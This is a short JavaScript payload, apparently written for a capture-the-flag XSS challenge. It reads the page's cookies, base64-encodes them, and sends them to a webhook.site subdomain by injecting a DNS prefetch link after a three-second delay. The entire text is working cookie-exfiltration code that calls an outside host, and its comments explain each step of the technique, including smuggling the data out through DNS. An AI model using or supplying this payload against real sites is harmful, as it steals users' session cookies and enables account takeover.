setTimeout(() => {
    // Get the flag from the cookie
    let flag = document.cookie;
    
    // Encode it to Base64, remove padding (=), and make it lowercase
    // This makes it a valid, safe DNS subdomain
    let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();

    // Inject a DNS prefetch link
    let link = document.createElement('link');
    link.rel = 'prefetch';
    
    // Set the href to a subdomain of your unique webhook ID
    link.href = 'http://' + safeFlag + '.c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site/';
    
    // Append it to the document to trigger the DNS lookup
    document.head.appendChild(link);
}, 3000);
